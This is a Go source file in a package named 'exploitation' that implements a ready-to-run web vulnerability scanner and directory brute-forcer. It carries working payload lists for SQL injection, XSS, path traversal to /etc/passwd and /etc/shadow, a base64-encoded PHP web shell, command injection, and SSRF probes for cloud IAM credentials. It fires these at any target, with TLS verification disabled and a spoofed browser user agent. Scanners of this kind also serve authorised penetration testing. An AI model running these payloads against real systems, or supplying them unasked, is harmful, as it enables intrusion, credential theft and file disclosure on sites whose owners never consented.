package exploitation
import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
	"github.com/fatih/color"
)
// VulnScanner performs real web vulnerability scanning
type VulnScanner struct {
	Target    string
	Depth     int
	Verbose   bool
	Client    *http.Client
	UserAgent string
	Results   []Vulnerability
	mu        sync.Mutex
}
// Vulnerability represents a discovered vulnerability
type Vulnerability struct {
	Type        string
	Severity    string
	URL         string
	Parameter   string
	Payload     string
	Evidence    string
	StatusCode  int
	Description string
	Remediation string
}
// SQL Injection payloads - real detection payloads
var sqlPayloads = []struct {
	payload   string
	errorSigs []string
}{
	{"'", []string{"sql syntax", "mysql", "sqlite", "postgresql", "ora-", "sql server", "syntax error"}},
	{"\"", []string{"sql syntax", "mysql", "unterminated", "quoted string"}},
	{"' OR '1'='1", []string{"sql syntax", "boolean", "true"}},
	{"' OR '1'='1' --", []string{"sql syntax", "mysql"}},
	{"' OR '1'='1' #", []string{"sql syntax", "mysql"}},
	{"1' ORDER BY 1--", []string{"unknown column", "order by"}},
	{"1' ORDER BY 10--", []string{"unknown column", "order by"}},
	{"1 UNION SELECT NULL--", []string{"union", "select", "column"}},
	{"1' AND '1'='1", []string{}},
	{"1' AND '1'='2", []string{}},
	{"1' WAITFOR DELAY '0:0:5'--", []string{}},
	{"1'; WAITFOR DELAY '0:0:5'--", []string{}},
	{"1' AND SLEEP(5)--", []string{}},
	{"' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", []string{"xpath", "extractvalue"}},
	{"' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--", []string{"xpath", "updatexml"}},
}
// XSS payloads - real detection payloads
var xssPayloads = []string{
	"<script>alert('XSS')</script>",
	"<img src=x onerror=alert('XSS')>",
	"<svg/onload=alert('XSS')>",
	"<body onload=alert('XSS')>",
	"<iframe src=\"javascript:alert('XSS')\">",
	"<input onfocus=alert('XSS') autofocus>",
	"<marquee onstart=alert('XSS')>",
	"<details open ontoggle=alert('XSS')>",
	"<video><source onerror=alert('XSS')>",
	"<audio src=x onerror=alert('XSS')>",
	"\"><script>alert('XSS')</script>",
	"'><script>alert('XSS')</script>",
	"<script>alert(String.fromCharCode(88,83,83))</script>",
	"<img src=\"x\" onerror=\"alert('XSS')\">",
	"<svg><script>alert('XSS')</script></svg>",
	"javascript:alert('XSS')",
	"<a href=\"javascript:alert('XSS')\">click</a>",
	"<div style=\"background:url(javascript:alert('XSS'))\">",
}
// LFI payloads - real file inclusion payloads
var lfiPayloads = []struct {
	payload string
	sigs    []string
}{
	{"../../../etc/passwd", []string{"root:", "/bin/bash", "/bin/sh", "nobody:"}},
	{"....//....//....//etc/passwd", []string{"root:", "/bin/bash"}},
	{"..%2f..%2f..%2fetc%2fpasswd", []string{"root:", "/bin/bash"}},
	{"..%252f..%252f..%252fetc%252fpasswd", []string{"root:", "/bin/bash"}},
	{"..../..../.../etc/passwd", []string{"root:", "/bin/bash"}},
	{"/etc/passwd", []string{"root:", "/bin/bash", "/bin/sh"}},
	{"/etc/shadow", []string{"root:", "$6$", "$5$", "$1$"}},
	{"../../../etc/hosts", []string{"localhost", "127.0.0.1"}},
	{"../../../proc/self/environ", []string{"PATH=", "HOME=", "USER="}},
	{"../../../proc/version", []string{"Linux version", "gcc"}},
	{"....//....//....//windows/win.ini", []string{"[fonts]", "[extensions]"}},
	{"..\\..\\..\\windows\\win.ini", []string{"[fonts]", "[extensions]"}},
	{"..%5c..%5c..%5cwindows%5cwin.ini", []string{"[fonts]", "[extensions]"}},
	{"php://filter/convert.base64-encode/resource=index.php", []string{"PD9waHA", "<?php"}},
	{"php://filter/read=string.rot13/resource=index.php", []string{"<?cuc", "rpub"}},
	{"file:///etc/passwd", []string{"root:", "/bin/bash"}},
	{"expect://id", []string{"uid=", "gid="}},
	{"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+", []string{}},
}
// Command injection payloads
var cmdPayloads = []struct {
	payload string
	sigs    []string
}{
	{"; id", []string{"uid=", "gid=", "groups="}},
	{"| id", []string{"uid=", "gid=", "groups="}},
	{"&& id", []string{"uid=", "gid=", "groups="}},
	{"|| id", []string{"uid=", "gid=", "groups="}},
	{"`id`", []string{"uid=", "gid=", "groups="}},
	{"$(id)", []string{"uid=", "gid=", "groups="}},
	{"; cat /etc/passwd", []string{"root:", "/bin/bash"}},
	{"| cat /etc/passwd", []string{"root:", "/bin/bash"}},
	{"; whoami", []string{"root", "www-data", "apache", "nginx"}},
	{"| whoami", []string{"root", "www-data", "apache", "nginx"}},
	{"; uname -a", []string{"Linux", "Darwin", "GNU"}},
	{"| uname -a", []string{"Linux", "Darwin", "GNU"}},
	{"& dir", []string{"Volume", "Directory", "<DIR>"}},
	{"| type C:\\Windows\\win.ini", []string{"[fonts]", "[extensions]"}},
	{"; ping -c 1 127.0.0.1", []string{"1 packets transmitted", "64 bytes"}},
	{"| ping -n 1 127.0.0.1", []string{"Reply from", "bytes="}},
}
// SSRF payloads
var ssrfPayloads = []struct {
	payload string
	sigs    []string
}{
	{"http://127.0.0.1", []string{}},
	{"http://localhost", []string{}},
	{"http://[::1]", []string{}},
	{"http://0.0.0.0", []string{}},
	{"http://169.254.169.254/latest/meta-data/", []string{"ami-id", "instance-id", "hostname"}},
	{"http://169.254.169.254/latest/meta-data/iam/security-credentials/", []string{"AccessKeyId", "SecretAccessKey"}},
	{"http://metadata.google.internal/computeMetadata/v1/", []string{"attributes", "hostname"}},
	{"http://169.254.170.2/v2/credentials", []string{}},
	{"http://192.168.1.1", []string{}},
	{"http://10.0.0.1", []string{}},
	{"file:///etc/passwd", []string{"root:", "/bin/bash"}},
	{"dict://127.0.0.1:6379/INFO", []string{"redis_version"}},
	{"gopher://127.0.0.1:6379/_INFO", []string{}},
}
// NewVulnScanner creates a new vulnerability scanner
func NewVulnScanner(target string, depth int, verbose bool) *VulnScanner {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:    100,
		IdleConnTimeout: 30 * time.Second,
	}
	client := &http.Client{
		Transport: transport,
		Timeout:   15 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 10 {
				return fmt.Errorf("too many redirects")
			}
			return nil
		},
	}
	return &VulnScanner{
		Target:    target,
		Depth:     depth,
		Verbose:   verbose,
		Client:    client,
		UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		Results:   make([]Vulnerability, 0),
	}
}
// ScanAll performs comprehensive vulnerability scan
func (vs *VulnScanner) ScanAll() error {
	color.Cyan("\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—")
	color.Cyan("â•‘           WEB VULNERABILITY SCANNER - REAL MODE              â•‘")
	color.Cyan("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
	color.Cyan("\nğŸ¯ Target: %s", vs.Target)
	color.Cyan("ğŸ“Š Depth: %d\n", vs.Depth)
	startTime := time.Now()
	color.Yellow("\n[1/6] Testing SQL Injection...")
	vs.ScanSQLInjection()
	color.Yellow("\n[2/6] Testing Cross-Site Scripting (XSS)...")
	vs.ScanXSS()
	color.Yellow("\n[3/6] Testing Local File Inclusion (LFI)...")
	vs.ScanFileInclusion()
	color.Yellow("\n[4/6] Testing Command Injection...")
	vs.ScanCommandInjection()
	color.Yellow("\n[5/6] Testing SSRF...")
	vs.ScanSSRF()
	color.Yellow("\n[6/6] Testing Open Redirect...")
	vs.ScanOpenRedirect()
	elapsed := time.Since(startTime)
	vs.PrintResults()
	color.Cyan("\nâ±ï¸  Scan completed in %v\n", elapsed.Round(time.Second))
	return nil
}
// ScanSQLInjection tests for SQL injection vulnerabilities
func (vs *VulnScanner) ScanSQLInjection() error {
	params := []string{"id", "user", "username", "page", "cat", "category", "search", "q", "query", "item", "product", "order", "sort"}
	for _, param := range params {
		for _, pl := range sqlPayloads {
			testURL := fmt.Sprintf("%s?%s=%s", vs.Target, param, url.QueryEscape(pl.payload))
			resp, body, err := vs.makeRequest("GET", testURL, nil)
			if err != nil {
				continue
			}
			// Check for SQL error signatures
			bodyLower := strings.ToLower(body)
			for _, sig := range pl.errorSigs {
				if strings.Contains(bodyLower, strings.ToLower(sig)) {
					vs.addVulnerability(Vulnerability{
						Type:        "SQL Injection",
						Severity:    "Critical",
						URL:         testURL,
						Parameter:   param,
						Payload:     pl.payload,
						Evidence:    vs.extractEvidence(body, sig),
						StatusCode:  resp.StatusCode,
						Description: fmt.Sprintf("SQL error signature '%s' found in response", sig),
						Remediation: "Use parameterized queries/prepared statements",
					})
					if vs.Verbose {
						color.Red("  âš ï¸  FOUND: SQL Injection in '%s' parameter", param)
					}
					break
				}
			}
			// Time-based blind SQL injection detection
			if strings.Contains(pl.payload, "SLEEP") || strings.Contains(pl.payload, "WAITFOR") {
				start := time.Now()
				vs.makeRequest("GET", testURL, nil)
				if time.Since(start) >= 4*time.Second {
					vs.addVulnerability(Vulnerability{
						Type:        "Blind SQL Injection (Time-based)",
						Severity:    "Critical",
						URL:         testURL,
						Parameter:   param,
						Payload:     pl.payload,
						Evidence:    fmt.Sprintf("Response delayed by %v", time.Since(start)),
						StatusCode:  resp.StatusCode,
						Description: "Time-based blind SQL injection detected",
						Remediation: "Use parameterized queries/prepared statements",
					})
					if vs.Verbose {
						color.Red("  âš ï¸  FOUND: Blind SQL Injection (time-based) in '%s'", param)
					}
				}
			}
			time.Sleep(50 * time.Millisecond)
		}
	}
	return nil
}
// ScanXSS tests for XSS vulnerabilities
func (vs *VulnScanner) ScanXSS() error {
	params := []string{"q", "search", "query", "name", "comment", "message", "text", "data", "input", "value", "content", "redirect", "url", "callback"}
	for _, param := range params {
		for _, payload := range xssPayloads {
			testURL := fmt.Sprintf("%s?%s=%s", vs.Target, param, url.QueryEscape(payload))
			_, body, err := vs.makeRequest("GET", testURL, nil)
			if err != nil {
				continue
			}
			// Check if payload is reflected in response
			if strings.Contains(body, payload) {
				vs.addVulnerability(Vulnerability{
					Type:        "Reflected XSS",
					Severity:    "High",
					URL:         testURL,
					Parameter:   param,
					Payload:     payload,
					Evidence:    vs.extractEvidence(body, payload),
					Description: "XSS payload reflected in response without encoding",
					Remediation: "Sanitize and encode user input, implement Content-Security-Policy",
				})
				if vs.Verbose {
					color.Red("  âš ï¸  FOUND: Reflected XSS in '%s' parameter", param)
				}
				break
			}
			time.Sleep(50 * time.Millisecond)
		}
	}
	return nil
}
// ScanFileInclusion tests for LFI/RFI vulnerabilities
func (vs *VulnScanner) ScanFileInclusion() error {
	params := []string{"file", "page", "include", "path", "template", "document", "folder", "root", "pg", "style", "pdf", "lang", "doc", "view", "content", "mod"}
	for _, param := range params {
		for _, pl := range lfiPayloads {
			testURL := fmt.Sprintf("%s?%s=%s", vs.Target, param, url.QueryEscape(pl.payload))
			_, body, err := vs.makeRequest("GET", testURL, nil)
			if err != nil {
				continue
			}
			for _, sig := range pl.sigs {
				if strings.Contains(body, sig) {
					severity := "High"
					vulnType := "Local File Inclusion (LFI)"
					if strings.HasPrefix(pl.payload, "http") || strings.HasPrefix(pl.payload, "file:") {
						vulnType = "Remote File Inclusion (RFI)"
						severity = "Critical"
					}
					vs.addVulnerability(Vulnerability{
						Type:        vulnType,
						Severity:    severity,
						URL:         testURL,
						Parameter:   param,
						Payload:     pl.payload,
						Evidence:    vs.extractEvidence(body, sig),
						Description: fmt.Sprintf("File content signature '%s' found", sig),
						Remediation: "Validate and whitelist file paths, avoid user input in file operations",
					})
					if vs.Verbose {
						color.Red("  âš ï¸  FOUND: %s in '%s' parameter", vulnType, param)
					}
					break
				}
			}
			time.Sleep(50 * time.Millisecond)
		}
	}
	return nil
}
// ScanCommandInjection tests for command injection
func (vs *VulnScanner) ScanCommandInjection() error {
	params := []string{"cmd", "command", "exec", "execute", "ping", "ip", "host", "target", "file", "filename", "dir", "path"}
	for _, param := range params {
		for _, pl := range cmdPayloads {
			testURL := fmt.Sprintf("%s?%s=%s", vs.Target, param, url.QueryEscape(pl.payload))
			_, body, err := vs.makeRequest("GET", testURL, nil)
			if err != nil {
				continue
			}
			for _, sig := range pl.sigs {
				if strings.Contains(body, sig) {
					vs.addVulnerability(Vulnerability{
						Type:        "Command Injection",
						Severity:    "Critical",
						URL:         testURL,
						Parameter:   param,
						Payload:     pl.payload,
						Evidence:    vs.extractEvidence(body, sig),
						Description: fmt.Sprintf("Command output signature '%s' found", sig),
						Remediation: "Never pass user input to system commands, use whitelists",
					})
					if vs.Verbose {
						color.Red("  âš ï¸  FOUND: Command Injection in '%s' parameter", param)
					}
					break
				}
			}
			time.Sleep(50 * time.Millisecond)
		}
	}
	return nil
}
// ScanSSRF tests for SSRF vulnerabilities
func (vs *VulnScanner) ScanSSRF() error {
	params := []string{"url", "uri", "path", "dest", "redirect", "link", "site", "target", "page", "domain", "callback", "return", "next", "data", "load", "request"}
	for _, param := range params {
		for _, pl := range ssrfPayloads {
			testURL := fmt.Sprintf("%s?%s=%s", vs.Target, param, url.QueryEscape(pl.payload))
			_, body, err := vs.makeRequest("GET", testURL, nil)
			if err != nil {
				continue
			}
			for _, sig := range pl.sigs {
				if strings.Contains(body, sig) {
					vs.addVulnerability(Vulnerability{
						Type:        "Server-Side Request Forgery (SSRF)",
						Severity:    "High",
						URL:         testURL,
						Parameter:   param,
						Payload:     pl.payload,
						Evidence:    vs.extractEvidence(body, sig),
						Description: fmt.Sprintf("SSRF response signature '%s' found", sig),
						Remediation: "Validate and whitelist URLs, use network segmentation",
					})
					if vs.Verbose {
						color.Red("  âš ï¸  FOUND: SSRF in '%s' parameter", param)
					}
					break
				}
			}
			time.Sleep(50 * time.Millisecond)
		}
	}
	return nil
}
// ScanOpenRedirect tests for open redirect vulnerabilities
func (vs *VulnScanner) ScanOpenRedirect() error {
	params := []string{"url", "redirect", "next", "return", "redir", "target", "dest", "destination", "continue", "goto", "returnTo", "return_url", "checkout_url"}
	testDomains := []string{"https://evil.com", "//evil.com", "https://google.com@evil.com", "/\\evil.com", "///evil.com"}
	for _, param := range params {
		for _, domain := range testDomains {
			testURL := fmt.Sprintf("%s?%s=%s", vs.Target, param, url.QueryEscape(domain))
			resp, _, err := vs.makeRequestNoRedirect("GET", testURL, nil)
			if err != nil {
				continue
			}
			location := resp.Header.Get("Location")
			if location != "" && (strings.Contains(location, "evil.com") || strings.Contains(location, "google.com@")) {
				vs.addVulnerability(Vulnerability{
					Type:        "Open Redirect",
					Severity:    "Medium",
					URL:         testURL,
					Parameter:   param,
					Payload:     domain,
					Evidence:    fmt.Sprintf("Redirects to: %s", location),
					StatusCode:  resp.StatusCode,
					Description: "Application redirects to user-controlled URL",
					Remediation: "Validate redirect destinations, use whitelist",
				})
				if vs.Verbose {
					color.Red("  âš ï¸  FOUND: Open Redirect in '%s' parameter", param)
				}
				break
			}
			time.Sleep(50 * time.Millisecond)
		}
	}
	return nil
}
// makeRequest sends HTTP request and returns response
func (vs *VulnScanner) makeRequest(method, targetURL string, body io.Reader) (*http.Response, string, error) {
	req, err := http.NewRequest(method, targetURL, body)
	if err != nil {
		return nil, "", err
	}
	req.Header.Set("User-Agent", vs.UserAgent)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	resp, err := vs.Client.Do(req)
	if err != nil {
		return nil, "", err
	}
	defer resp.Body.Close()
	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return resp, "", err
	}
	return resp, string(bodyBytes), nil
}
// makeRequestNoRedirect sends request without following redirects
func (vs *VulnScanner) makeRequestNoRedirect(method, targetURL string, body io.Reader) (*http.Response, string, error) {
	client := &http.Client{
		Transport: vs.Client.Transport,
		Timeout:   vs.Client.Timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	req, err := http.NewRequest(method, targetURL, body)
	if err != nil {
		return nil, "", err
	}
	req.Header.Set("User-Agent", vs.UserAgent)
	resp, err := client.Do(req)
	if err != nil {
		return nil, "", err
	}
	defer resp.Body.Close()
	bodyBytes, _ := io.ReadAll(resp.Body)
	return resp, string(bodyBytes), nil
}
// addVulnerability adds a vulnerability to results
func (vs *VulnScanner) addVulnerability(vuln Vulnerability) {
	vs.mu.Lock()
	defer vs.mu.Unlock()
	vs.Results = append(vs.Results, vuln)
}
// extractEvidence extracts evidence from response body
func (vs *VulnScanner) extractEvidence(body, match string) string {
	idx := strings.Index(strings.ToLower(body), strings.ToLower(match))
	if idx == -1 {
		return ""
	}
	start := idx - 50
	if start < 0 {
		start = 0
	}
	end := idx + len(match) + 50
	if end > len(body) {
		end = len(body)
	}
	return "..." + body[start:end] + "..."
}
// PrintResults displays scan results
func (vs *VulnScanner) PrintResults() {
	color.Cyan("\n\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—")
	color.Cyan("â•‘                    VULNERABILITY REPORT                       â•‘")
	color.Cyan("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n")
	if len(vs.Results) == 0 {
		color.Green("âœ… No vulnerabilities detected!\n")
		return
	}
	// Count by severity
	critical, high, medium, low := 0, 0, 0, 0
	for _, v := range vs.Results {
		switch v.Severity {
		case "Critical":
			critical++
		case "High":
			high++
		case "Medium":
			medium++
		case "Low":
			low++
		}
	}
	color.Yellow("ğŸ“Š Summary:")
	if critical > 0 {
		color.Red("   ğŸ”´ Critical: %d", critical)
	}
	if high > 0 {
		color.Red("   ğŸŸ  High: %d", high)
	}
	if medium > 0 {
		color.Yellow("   ğŸŸ¡ Medium: %d", medium)
	}
	if low > 0 {
		color.Green("   ğŸŸ¢ Low: %d", low)
	}
	color.Cyan("\nğŸ“‹ Detailed Findings:\n")
	for i, v := range vs.Results {
		severityColor := color.YellowString
		switch v.Severity {
		case "Critical":
			severityColor = color.RedString
		case "High":
			severityColor = color.RedString
		case "Low":
			severityColor = color.GreenString
		}
		fmt.Printf("%d. %s [%s]\n", i+1, color.CyanString(v.Type), severityColor(v.Severity))
		fmt.Printf("   URL: %s\n", v.URL)
		fmt.Printf("   Parameter: %s\n", v.Parameter)
		fmt.Printf("   Payload: %s\n", v.Payload)
		if v.Evidence != "" {
			fmt.Printf("   Evidence: %s\n", truncate(v.Evidence, 100))
		}
		fmt.Printf("   Remediation: %s\n\n", v.Remediation)
	}
}
// DirectoryBrute performs real directory brute forcing
type DirectoryBrute struct {
	Target     string
	Wordlist   string
	Extensions []string
	Threads    int
	Timeout    time.Duration
	UserAgent  string
	Found      []FoundPath
	Attempts   int64
	mu         sync.Mutex
	Client     *http.Client
}
// FoundPath represents a found directory/file
type FoundPath struct {
	URL         string
	StatusCode  int
	Size        int64
	ContentType string
	Redirect    string
}
// NewDirectoryBrute creates new directory brute forcer
func NewDirectoryBrute(target, wordlist string, extensions []string, threads int) *DirectoryBrute {
	transport := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:        threads * 2,
		MaxIdleConnsPerHost: threads,
		IdleConnTimeout:     30 * time.Second,
	}
	client := &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	return &DirectoryBrute{
		Target:     strings.TrimRight(target, "/"),
		Wordlist:   wordlist,
		Extensions: extensions,
		Threads:    threads,
		Timeout:    10 * time.Second,
		UserAgent:  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		Found:      make([]FoundPath, 0),
		Client:     client,
	}
}
// Brute performs directory brute forcing
func (db *DirectoryBrute) Brute() error {
	color.Cyan("\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—")
	color.Cyan("â•‘              DIRECTORY BRUTE FORCE - REAL MODE               â•‘")
	color.Cyan("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
	color.Cyan("\nğŸ¯ Target: %s", db.Target)
	color.Cyan("ğŸ“ Wordlist: %s", db.Wordlist)
	color.Cyan("ğŸ“ Extensions: %v", db.Extensions)
	color.Cyan("âš¡ Threads: %d\n", db.Threads)
	file, err := os.Open(db.Wordlist)
	if err != nil {
		return fmt.Errorf("failed to open wordlist: %v", err)
	}
	defer file.Close()
	wordChan := make(chan string, db.Threads*2)
	doneChan := make(chan bool)
	var wg sync.WaitGroup
	// Start workers
	for i := 0; i < db.Threads; i++ {
		wg.Add(1)
		go db.worker(wordChan, &wg)
	}
	// Progress reporter
	go db.reportProgress(doneChan)
	// Read and send words
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		word := strings.TrimSpace(scanner.Text())
		if word == "" || strings.HasPrefix(word, "#") {
			continue
		}
		wordChan <- word
	}
	close(wordChan)
	wg.Wait()
	doneChan <- true
	db.printResults()
	return nil
}
func (db *DirectoryBrute) worker(wordChan chan string, wg *sync.WaitGroup) {
	defer wg.Done()
	for word := range wordChan {
		// Try without extension
		db.checkPath(word)
		// Try with extensions
		for _, ext := range db.Extensions {
			db.checkPath(word + ext)
		}
		// Try as directory
		db.checkPath(word + "/")
	}
}
func (db *DirectoryBrute) checkPath(path string) {
	db.mu.Lock()
	db.Attempts++
	db.mu.Unlock()
	url := db.Target + "/" + path
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return
	}
	req.Header.Set("User-Agent", db.UserAgent)
	resp, err := db.Client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	// Interesting status codes
	if resp.StatusCode == 200 || resp.StatusCode == 301 || resp.StatusCode == 302 ||
		resp.StatusCode == 401 || resp.StatusCode == 403 {
		body, _ := io.ReadAll(resp.Body)
		size := int64(len(body))
		redirect := ""
		if resp.StatusCode == 301 || resp.StatusCode == 302 {
			redirect = resp.Header.Get("Location")
		}
		found := FoundPath{
			URL:         url,
			StatusCode:  resp.StatusCode,
			Size:        size,
			ContentType: resp.Header.Get("Content-Type"),
			Redirect:    redirect,
		}
		db.mu.Lock()
		db.Found = append(db.Found, found)
		db.mu.Unlock()
		// Print immediately
		statusColor := color.GreenString
		switch resp.StatusCode {
		case 301, 302:
			statusColor = color.YellowString
		case 401, 403:
			statusColor = color.RedString
		}
		color.Cyan("  [%s] %-60s (%d bytes)", statusColor("%d", resp.StatusCode), url, size)
		if redirect != "" {
			color.Yellow("       â†’ %s", redirect)
		}
	}
}
func (db *DirectoryBrute) reportProgress(done chan bool) {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()
	start := time.Now()
	for {
		select {
		case <-done:
			return
		case <-ticker.C:
			db.mu.Lock()
			attempts := db.Attempts
			found := len(db.Found)
			db.mu.Unlock()
			elapsed := time.Since(start).Seconds()
			rate := float64(attempts) / elapsed
			color.Yellow("  âš¡ Progress: %d attempts | %.0f req/sec | %d found", attempts, rate, found)
		}
	}
}
func (db *DirectoryBrute) printResults() {
	color.Cyan("\n\nğŸ“Š RESULTS SUMMARY")
	color.Cyan("â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
	if len(db.Found) == 0 {
		color.Yellow("No directories/files found\n")
		return
	}
	color.Green("Found %d directories/files:\n", len(db.Found))
	// Group by status code
	status200, status30x, status40x := []FoundPath{}, []FoundPath{}, []FoundPath{}
	for _, f := range db.Found {
		switch f.StatusCode {
		case 200:
			status200 = append(status200, f)
		case 301, 302:
			status30x = append(status30x, f)
		case 401, 403:
			status40x = append(status40x, f)
		}
	}
	if len(status200) > 0 {
		color.Green("\nâœ… OK (200):")
		for _, f := range status200 {
			fmt.Printf("   %s (%d bytes)\n", f.URL, f.Size)
		}
	}
	if len(status30x) > 0 {
		color.Yellow("\nâ†ªï¸  Redirects (301/302):")
		for _, f := range status30x {
			fmt.Printf("   %s â†’ %s\n", f.URL, f.Redirect)
		}
	}
	if len(status40x) > 0 {
		color.Red("\nğŸ”’ Protected (401/403):")
		for _, f := range status40x {
			fmt.Printf("   %s\n", f.URL)
		}
	}
}
func truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max] + "..."
}
